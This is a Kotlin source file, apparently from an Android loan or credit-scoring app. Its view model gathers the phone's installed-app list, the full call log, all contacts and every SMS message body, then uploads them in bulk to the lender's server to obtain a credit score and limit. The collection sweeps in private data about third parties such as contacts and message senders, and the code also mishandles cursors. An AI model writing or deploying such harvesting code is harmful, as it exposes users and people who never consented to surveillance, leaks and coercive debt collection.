package com.credit.intelligencia.permission

import android.content.Context
import android.content.Context.TELEPHONY_SERVICE
import android.content.pm.ApplicationInfo
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.core.content.ContextCompat.getSystemService
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import androidx.navigation.NavDirections
import com.credit.intelligencia.api.Infor
import com.credit.intelligencia.api.IntelligenciaApi
import com.credit.intelligencia.data.*
import com.credit.intelligencia.util.Event
import com.credit.intelligencia.util.asEvent
import com.credit.intelligencia.util.handleThrowable
import com.google.gson.GsonBuilder
import com.google.gson.JsonObject
import kotlinx.coroutines.*
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import org.json.JSONObject
import timber.log.Timber
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*


class PermissionViewModel(
    val api: IntelligenciaApi,
    val context: Context
) : ViewModel() {

    var creditLimits: ScoreLimit? = null

    private val _uiState = MutableLiveData<PermissionUIState>()
    val uiState: LiveData<PermissionUIState> = _uiState

    private val _interactions = MutableLiveData<Event<PermissionActions>>()
    val interactions: LiveData<Event<PermissionActions>> = _interactions

    private val exceptionHandler = CoroutineExceptionHandler { _, exception ->
        Timber.e(exception)
        val errorPair = exception.handleThrowable()
    }


    fun getEverything(email: String) {

        //apps
        val appList = arrayListOf<MobileApps>()
        val packageManager = context.packageManager
        val applicationList = packageManager.getInstalledApplications(0)
        val it: Iterator<ApplicationInfo> = applicationList.iterator()
        while (it.hasNext()) {
            val appname = packageManager.getApplicationLabel(it.next()).toString()
            appList.add(
                MobileApps(
                    appname
                )
            )
        }
        //calls
        val callLogsList = arrayListOf<CallLogs>()

        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, CallLog.Calls.DATE + " DESC"
        )

        while (cursor != null && cursor.moveToNext()) {
            val id = cursor.getColumnIndex(CallLog.Calls._ID)
            val callId = cursor.getString(id)

            val phoneid = cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
            val phoneId = cursor.getString(phoneid)

            val number = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val phoneNumber = cursor.getString(number)

            val type = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val callTypes = cursor.getString(type)
            val callType = callTypes.toInt()

            val date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
            val datee = Date(date.toLong())
            val ft = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault())

            // Call time

            val smsTime =
                cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)).toLong()
            val time = Date()
            time.time = smsTime
            val simpleTimeFormat = SimpleDateFormat("HH:mm:ss")
            val timeString = simpleTimeFormat.format(time)

            val simwhat =
                cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.VIA_NUMBER))

            val duration = cursor.getColumnIndex(CallLog.Calls.DURATION)
            val callDuration = cursor.getString(duration)

            var dir: String? = null
            when (callType) {
                CallLog.Calls.OUTGOING_TYPE ->                     // Log.d("type","OUTGOING");
                    dir = "OUTGOING"
                CallLog.Calls.INCOMING_TYPE ->                     // System.out.println("INCOMING");
                    //  Log.d("type","INCOMING");
                    dir = "INCOMING"
                CallLog.Calls.MISSED_TYPE ->
                    dir = "MISSED"
                CallLog.Calls.BLOCKED_TYPE -> {
                    dir = "BLOCKED"
                }
                CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> {
                    dir = "ANSWERED EXTERNALLY"
                }
                CallLog.Calls.REJECTED_TYPE -> {
                    dir = "REJECTED"
                }
                CallLog.Calls.VOICEMAIL_TYPE -> {
                    dir = "VOICE"
                }
            }

            callLogsList.add(
                CallLogs(
                    callId, phoneId, phoneNumber, callType, callDuration,
                    ft.format(datee), simwhat, timeString
                )
            )
        }
        cursor?.close()
        //contacts
        val contactList = arrayListOf<Contacts>()
        val cursor2 = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null
        )
        while (cursor2 != null && cursor2.moveToNext()) {
            val userName =
                cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val userPhoneNumber =
                cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            val userEmail =
                cursor2.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
            val userNumber = cursor2.getColumnIndex(ContactsContract.Contacts._ID)

            val name = cursor2.getString(userName)
            val phoneNumber = cursor2.getString(userPhoneNumber)
            val email = cursor2.getString(userEmail)
            val number = cursor2.getString(userNumber)

            contactList.add(Contacts(name, phoneNumber, email, number))
        }
        cursor?.close()
        //messages
        val messageList = arrayListOf<Message>()
        val cursor3 = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, null
        )

        while (cursor3 != null && cursor3.moveToNext()) {
            //Date
            val smsDate =
                cursor3.getString(cursor3.getColumnIndexOrThrow(Telephony.Sms.DATE)).toLong()
            val date = Date()
            date.time = smsDate
            val simpleDateFormat = SimpleDateFormat("dd/MM/yyyy")
            val dateString = simpleDateFormat.format(date)
            // Time
            val smsTime =
                cursor3.getString(cursor3.getColumnIndexOrThrow(Telephony.Sms.DATE)).toLong()
            val time = Date()
            time.time = smsTime
            val simpleTimeFormat = SimpleDateFormat("HH:mm:ss")
            val timeString = simpleTimeFormat.format(time)
            // Sender address
            val address = cursor3.getString(cursor3.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
            // Message Body
            val body =
                cursor3.getString(cursor3.getColumnIndexOrThrow(Telephony.Sms.BODY)).toString()
            // Message Id
            val id = cursor3.getString(cursor3.getColumnIndexOrThrow(Telephony.Sms._ID))

            messageList.add(Message(address, body, dateString, timeString, id))
        }
        cursor?.close()

        //convert to json and sending them
        viewModelScope.launch(Dispatchers.IO) {
            /**
             * UPLOAD JSON FILE TO SERVER
             */
            //Json File
            val gson = GsonBuilder().setPrettyPrinting().create()
            //applist
            val userApps = gson.toJson(appList)
            val userAppsString: String = userApps.toString()
            val fileApp = File(context.filesDir, "ApplicationList.json")
            val fileWriterApp = FileWriter(fileApp)
            val bufferedWriterApps = BufferedWriter(fileWriterApp)
            bufferedWriterApps.write(userAppsString)
            bufferedWriterApps.close()
            //messages
            val userMessageList = gson.toJson(messageList)
            val userMessageString: String = userMessageList.toString()
            val fileMessage = File(context.filesDir, "MessageList.json")
            val fileWriterMessages = FileWriter(fileMessage)
            val bufferedWriterMessages = BufferedWriter(fileWriterMessages)
            bufferedWriterMessages.write(userMessageString)
            bufferedWriterMessages.close()
            //contacts
            val userContact = gson.toJson(contactList)
            val userContactString: String = userContact.toString()
            val fileContact = File(context.filesDir, "ContactList.json")
            val fileWriterContact = FileWriter(fileContact)
            val bufferedWriterContact = BufferedWriter(fileWriterContact)
            bufferedWriterContact.write(userContactString)
            bufferedWriterContact.close()
            //call
            val userCallLogs = gson.toJson(callLogsList)
            val userCallLogsString: String = userCallLogs.toString()
            val fileCall = File(context.filesDir, "CalllogList.json")
            val fileWriterCall = FileWriter(fileCall)
            val bufferedWriterCall = BufferedWriter(fileWriterCall)
            bufferedWriterCall.write(userCallLogsString)
            bufferedWriterCall.close()

            _uiState.postValue(PermissionUIState.Loading)
            viewModelScope.launch(exceptionHandler) {
                val userData = withContext(Dispatchers.IO) {
                    val file = MultipartBody.Part.createFormData(
                        "file",
                        fileApp.getName(),
                        RequestBody.create("Application/*".toMediaTypeOrNull(), fileApp)
                    )
                    val file2 = MultipartBody.Part.createFormData(
                        "file",
                        fileContact.getName(),
                        RequestBody.create("contact/*".toMediaTypeOrNull(), fileContact)
                    )
                    val file3 = MultipartBody.Part.createFormData(
                        "file",
                        fileMessage.getName(),
                        RequestBody.create("message/*".toMediaTypeOrNull(), fileMessage)
                    )
                    val file4 = MultipartBody.Part.createFormData(
                        "file",
                        fileCall.getName(),
                        RequestBody.create("call/*".toMediaTypeOrNull(), fileCall)
                    )
                    val a =
                        api.postFiles(
                            info = Infor(email),
                            file,
                            file2,
                            file3,
                            file4
                        )
                    val p = a
                }
            }
        }
    }

    fun getScoreLimitImmediately(email: String) {
        _uiState.postValue(PermissionUIState.Loading)
        viewModelScope.launch(exceptionHandler) {
            val userScoreLimitResponse = withContext(Dispatchers.IO) {
                api.getScoreLimit(
                    email = email
                )
            }
            val a = userScoreLimitResponse

            val b = a.body() as String
            val jsonObject = JSONObject(b)
            val limit = jsonObject.getInt("limit")
            val score = jsonObject.getInt("score")
            _uiState.postValue(
                PermissionUIState.LimitScore(
                    score = score,
                    limits = limit
                )
            )

            creditLimits = ScoreLimit(
                score = score,
                limit = limit
            )
        }
    }

        fun getScoreLimit(email: String) {
            this.creditLimits?.let {
                val destination = PermissionFragmentDirections.toLoanApplicationFragment(
                    it, email = email
                )
                val actions: PermissionActions = PermissionActions.Navigate(destination)
                _interactions.postValue(actions.asEvent())
            }


    }
}

    sealed class PermissionActions {
        data class Navigate(val destination: NavDirections) : PermissionActions()
    }

    sealed class PermissionUIState {

        object Loading : PermissionUIState()

        data class Error(val title: String = "Try again", val message: Any) :
            PermissionUIState()

        data class LimitScore(val score: Int, val limits: Int) :
            PermissionUIState()

        data class LimitError(val message: String) : PermissionUIState()
}


